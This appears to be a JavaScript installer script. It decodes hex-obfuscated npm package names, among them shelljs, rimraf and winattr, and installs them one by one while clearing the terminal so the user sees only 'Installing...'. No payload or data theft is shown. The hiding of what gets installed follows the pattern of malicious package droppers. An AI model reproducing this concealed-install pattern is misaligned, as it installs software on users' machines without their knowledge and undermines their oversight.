var hW = [
    fhs('6368656572696f'),        // [0] - cheerio
    fhs('636c692d636f6c6f72'),    // [1] - cli-color
    fhs('66732d6578747261'),      // [2] - fs-extra
    fhs('72657175657374'),        // [3] - request
    fhs('726571756573742d70726f6d697365'),// [4] - request-promise
    fhs('72696d726166'),          // [5] - rimraf
    fhs('7368656c6c6a73'),        // [6] - shelljs
    fhs('77696e61747472'),        // [7] - winattr
    fhs('6e706d'),                // [8] - npm_
],
    npm = require('npm'),
    log = console.log,
    startPackageIndex = 1,
    endPackageIndex = 8
function npmInstall(packageName, callback) {
    npm.load(function (err) {
        npm.commands.install([packageName], function (er, data) {   
            if(startPackageIndex < endPackageIndex){
                process.stdout.write('\033c'); 
                log('Installing...')          
                npmInstall(hex2a(hW[startPackageIndex]), callback)
            }
            else{
                process.stdout.write('\033c');  
                callback(true)
            }
            startPackageIndex = startPackageIndex + 1;
        });
    });
}
function fhs(hexString) {
    if ((hexString.length % 2) == 0) {
        var arr = hexString.split('');
        var y = 0;
        for (var i = 0; i < hexString.length / 2; i++) {
            arr.splice(y, 0, '\\x');
            y = y + 3;
        }
        return arr.join('')
    }
    else {
        log('formalize failed');
    }
}
function hex2a(hex) {
    var str = '';
    for (var i = 0; i < hex.length; i += 2) {
        var v = parseInt(hex.substr(i, 2), 16);
        if (v) str += String.fromCharCode(v);
    }
    return str;
}
(function () {
    log('Installing...')
    npmInstall(hex2a(hW[5]), function(){
        log('Installed')
        process.stdout.write('\033c');
    })
})()
